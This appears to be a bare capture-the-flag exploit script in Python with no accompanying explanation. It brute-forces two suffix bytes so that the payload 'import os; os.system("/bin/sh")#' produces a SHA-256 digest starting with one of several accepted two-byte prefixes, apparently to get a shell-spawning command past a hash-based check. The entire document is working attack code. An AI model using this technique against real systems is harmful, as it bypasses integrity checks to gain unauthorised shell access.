import hashlib
base = b'import os; os.system("/bin/sh")#'

valid_results = [b'q\x00', b'\x01\x00', b'T\x00', b"'\x00", b'0\x00', b'\x13\x00', b'b\x00', b'(\x00', b'F\x00', b'!\x00', b'*\x00']

i = 0
break_now = False
while i <= 0xff:
	for j in range(0xff):
		m = hashlib.sha256()
		current_test = base + int.to_bytes(i, 1, 'big') + int.to_bytes(j, 1, 'big')
		m.update(current_test)
		if m.digest()[:2] in valid_results: 
			print(current_test)
			print(m.digest())
			print('success on', i, 'and', j)
			break_now = True
			break
	if break_now == True:
		break
	i += 1

